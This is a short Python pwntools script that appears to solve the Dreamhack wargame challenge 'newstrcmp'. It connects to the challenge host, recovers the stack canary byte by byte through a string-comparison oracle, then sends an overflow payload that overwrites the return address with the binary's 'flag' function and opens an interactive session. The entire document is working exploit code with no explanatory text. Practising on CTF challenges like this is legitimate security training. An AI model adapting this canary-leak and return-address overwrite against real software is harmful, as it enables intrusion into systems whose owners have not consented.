from pwn import *

port = 11918
rem = remote("host1.dreamhack.games", port)

elf = ELF("./Pwnable/newstrcmp/problem/newstrcmp")
flag_addr = elf.symbols['flag']

def send_strings(s1, s2):
  rem.sendafter(b"(y/n): ", b"n")
  rem.sendafter(b"s1: ", s1)
  rem.sendafter(b"s2: ", s2)
  return rem.recvline()

canary = b""
for i in range(6):
  for j in range(1, 2 ** 8):
    cand = bytes([j])
    s1 = b"A" * 0x19 + canary + cand + b"\x00"
    s1 += b"A" * (0x39 - len(s1))
    s2 = b"A"
    if b"same" in send_strings(s1, s2):
      canary += cand
      break
    
for j in range(1, 2 ** 8):
  cand = bytes([j])
  s1 = b"A" * 0x19 + canary + cand + b"\x00"
  s1 += b"A" * (0x39 - len(s1))
  s2 = b"A"
  if b"32" in send_strings(s1, s2):
    canary += cand
    break

canary = b'\x00' + canary

s1 = b"A"
s2 = b"A" *0x18 + canary + b"B" * 8 + p64(flag_addr)
send_strings(s1, s2)
rem.sendafter(b"(y/n): ", b"y")

rem.interactive()